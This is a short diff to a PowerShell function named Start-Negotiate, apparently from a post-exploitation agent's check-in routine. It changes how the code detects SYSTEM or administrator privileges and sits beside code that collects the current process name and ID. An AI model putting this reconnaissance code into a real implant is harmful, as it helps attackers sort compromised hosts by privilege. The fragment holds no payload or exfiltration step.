@@ -72,7 +72,7 @@ function Start-Negotiate{
 
     # detect if we're SYSTEM or otherwise high-integrity
     if(([Environment]::UserName).ToLower() -eq "system"){$i+='|True'}
-    else{$i+='|'+($(whoami /groups) -join "").Contains("High Mandatory Level");}
+    else {$i += "|" +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}
 
     # get the current process name and ID
     $n=[System.Diagnostics.Process]::GetCurrentProcess();
